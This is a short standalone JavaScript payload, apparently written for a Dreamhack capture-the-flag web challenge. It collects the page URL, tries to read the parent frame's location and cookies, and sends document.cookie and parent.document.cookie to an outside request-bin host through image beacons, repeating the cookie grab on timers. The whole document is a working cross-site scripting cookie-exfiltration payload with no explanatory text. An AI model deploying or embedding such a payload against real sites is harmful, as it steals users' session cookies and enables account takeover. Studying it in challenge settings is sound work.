  (() => {
    const BIN = "https://tljjaad.request.dreamhack.games";
    const ID = "hostcheck_" + Date.now();

    const send = (k, v) => {
      new Image().src =
        `${BIN}/?id=${encodeURIComponent(ID)}&${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`;
    };

    send("href", location.href);
    send("loc_origin", location.origin);

    try { send("parent_href", parent.location.href); } catch (e) { send("parent_href_err", e.name); }
    try { send("parent_host", parent.location.host); } catch (e) { send("parent_host_err", e.name); }
    try { send("cookie_self", document.cookie); } catch (e) { send("cookie_self_err", e.name); }
    try { send("cookie_parent", parent.document.cookie); } catch (e) { send("cookie_parent_err", e.name); }

    [0, 1000, 2500, 4000].forEach(ms => {
      setTimeout(() => {
        try { send("cookie_parent_t" + ms, parent.document.cookie); } catch (e) { send("cookie_parent_t" + ms + "_err",
  e.name); }
      }, ms);
    });
  })();
